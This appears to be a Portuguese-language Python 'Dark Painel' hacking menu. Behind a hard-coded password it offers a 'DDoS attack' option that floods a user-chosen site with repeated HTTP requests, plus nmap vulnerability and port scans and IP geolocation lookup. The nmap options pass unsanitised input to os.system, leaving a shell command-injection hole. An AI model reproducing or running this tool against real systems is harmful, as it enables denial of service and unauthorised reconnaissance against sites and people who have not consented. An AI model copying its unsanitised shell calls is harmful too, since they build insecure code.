import os
import time
import requests

# Cores
vermelho = "\033[1;31m"
verde = "\033[1;32m"
azul = "\033[1;34m"
reset = "\033[0m"

# Função de banner
def banner():
    os.system("clear")
    os.system("toilet -f big 'Dark Painel' | lolcat")
    print(f"{vermelho}by github.com/totozk{reset}")
    print()

# Tela de senha
def autenticar():
    senha = "dark123"
    tentativa = input("Senha de acesso: ")
    if tentativa != senha:
        print(f"{vermelho}Senha incorreta! Saindo...{reset}")
        time.sleep(1)
        exit()

# DDoS (simples simulação com requests)
def ddos():
    banner()
    alvo = input("Digite o site/IP para atacar (ex: http://exemplo.com): ")
    try:
        print(f"{verde}Atacando {alvo}... pressione Ctrl+C para parar{reset}")
        while True:
            requests.get(alvo)
            print(f"{vermelho}Pacote enviado para {alvo}{reset}")
    except KeyboardInterrupt:
        print(f"\n{azul}Ataque finalizado.{reset}")
        input("Pressione ENTER para voltar ao menu...")

# Scan com Nmap
def scan_vulnerabilidades():
    banner()
    ip = input("Digite o IP alvo: ")
    print(f"{verde}Scaneando {ip} com Nmap...{reset}")
    os.system(f"nmap -sV {ip}")
    input("Pressione ENTER para voltar ao menu...")

# GeoIP
def localizar_ip():
    banner()
    ip = input("Digite o IP para localizar: ")
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json").json()
        print(f"{verde}IP: {ip}")
        print(f"País: {r['country_name']}")
        print(f"Cidade: {r['city']}")
        print(f"Região: {r['region']}")
        print(f"Org: {r['org']}{reset}")
    except:
        print(f"{vermelho}Erro ao localizar IP!{reset}")
    input("Pressione ENTER para voltar ao menu...")

# Scan de portas
def scan_portas():
    banner()
    ip = input("Digite o IP para escanear portas: ")
    os.system(f"nmap -Pn {ip}")
    input("Pressione ENTER para voltar ao menu...")

# Menu principal
def menu():
    while True:
        banner()
        print(f"{azul}1. Ataque DDoS")
        print("2. Scan de vulnerabilidades")
        print("3. Localizar IP (GeoIP)")
        print("4. Scan de portas")
        print("5. Sair{reset}")
        opcao = input("\nEscolha uma opção: ")

        if opcao == "1":
            ddos()
        elif opcao == "2":
            scan_vulnerabilidades()
        elif opcao == "3":
            localizar_ip()
        elif opcao == "4":
            scan_portas()
        elif opcao == "5":
            print("Saindo...")
            exit()
        else:
            print(f"{vermelho}Opção inválida!{reset}")
            time.sleep(1)

# Início
banner()
autenticar()
menu()
